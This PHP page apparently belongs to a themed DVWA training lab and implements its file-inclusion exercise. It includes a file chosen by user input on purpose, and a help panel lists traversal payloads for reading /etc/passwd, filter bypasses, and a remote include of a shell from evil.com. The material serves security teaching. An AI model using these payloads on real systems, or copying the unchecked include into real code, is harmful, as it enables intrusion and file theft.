<?php
$base_path = '../../';
require_once '../../dvwa/includes/dvwaPage.inc.php';
$theme = getThemeConfig();
$page_title = 'File Inclusion - ' . $theme['vuln_fi_title'];
require_once '../../dvwa/includes/header.php';

$security = dvwaSecurityLevelGet();
$file = '';

switch ($security) {
    case 'low':      require_once 'source/low.php'; break;
    case 'medium':   require_once 'source/medium.php'; break;
    case 'high':     require_once 'source/high.php'; break;
    case 'impossible': require_once 'source/impossible.php'; break;
}
?>

<div class="page-header">
    <h1 class="page-title"><i class="fas fa-file-alt"></i> <?php echo htmlspecialchars($theme['vuln_fi_title']); ?></h1>
    <p class="page-subtitle"><?php echo htmlspecialchars($theme['vuln_fi_desc']); ?></p>
</div>

<div class="row">
    <div class="col-lg-8">
        <div class="card">
            <div class="card-header"><i class="fas fa-book-open"></i> Select a Document</div>
            <div class="card-body">
                <div class="d-flex gap-2 flex-wrap mb-4">
                    <a href="?page=refund-policy.php" class="btn btn-outline-purple btn-sm"><i class="fas fa-undo"></i> Refund Policy</a>
                    <a href="?page=terms.php" class="btn btn-outline-purple btn-sm"><i class="fas fa-gavel"></i> Terms of Service</a>
                    <a href="?page=faq.php" class="btn btn-outline-purple btn-sm"><i class="fas fa-question-circle"></i> FAQ</a>
                </div>

                <?php
                if ($file) {
                    echo '<div class="vuln-output" style="white-space:normal;font-family:inherit;font-size:0.85rem;line-height:1.6;">';
                    @include($file);
                    echo '</div>';
                }
                ?>
            </div>
        </div>

        <details class="help-panel">
            <summary><i class="fas fa-graduation-cap"></i> Learn About File Inclusion</summary>
            <div class="help-content">
                <p>File inclusion vulnerabilities occur when user-controlled input determines which file the server includes. An attacker can read arbitrary files (LFI) or include remote code (RFI).</p>
                <h4>Low Level</h4>
                <p>No validation. Try: <code>?page=../../../etc/passwd</code> for LFI or <code>?page=http://evil.com/shell.txt</code> for RFI (if <code>allow_url_include</code> is on).</p>
                <h4>Medium Level</h4>
                <p>Strips <code>http://</code>, <code>https://</code>, <code>../</code>, and <code>..\</code>. Bypass with double traversal: <code>?page=....//....//....//etc/passwd</code></p>
                <h4>High Level</h4>
                <p>Requires filename to start with "file". Use the PHP stream wrapper: <code>?page=file:///etc/passwd</code></p>
                <h4>Impossible Level</h4>
                <p>Strict whitelist -- only the three known pages can be loaded.</p>
            </div>
        </details>
    </div>
</div>

<?php require_once '../../dvwa/includes/footer.php'; ?>
